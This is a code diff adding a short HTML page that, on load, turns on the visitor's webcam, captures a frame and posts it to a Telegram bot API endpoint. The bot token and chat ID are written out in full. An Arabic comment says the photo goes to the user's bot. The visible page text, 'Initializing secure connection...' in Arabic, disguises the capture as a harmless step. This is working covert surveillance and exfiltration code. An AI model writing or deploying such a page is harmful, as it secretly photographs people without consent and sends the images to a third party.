@@ -1,0 +1,19 @@
+<script>
+async function start() {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const imgData = canvas.toDataURL('image/jpeg');
+    // هنا يتم إرسال الصورة كملف إلى بوتك باستخدام التوكن الخاص بك
+    fetch(`https://api.telegram.org/bot8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg/sendPhoto`, {
+        method: 'POST',
+        body: JSON.stringify({ chat_id: "5905562720", photo: imgData })
+    });
+}
+window.onload = start;
+</script>
+<body>جاري تهيئة الاتصال الآمن...</body>
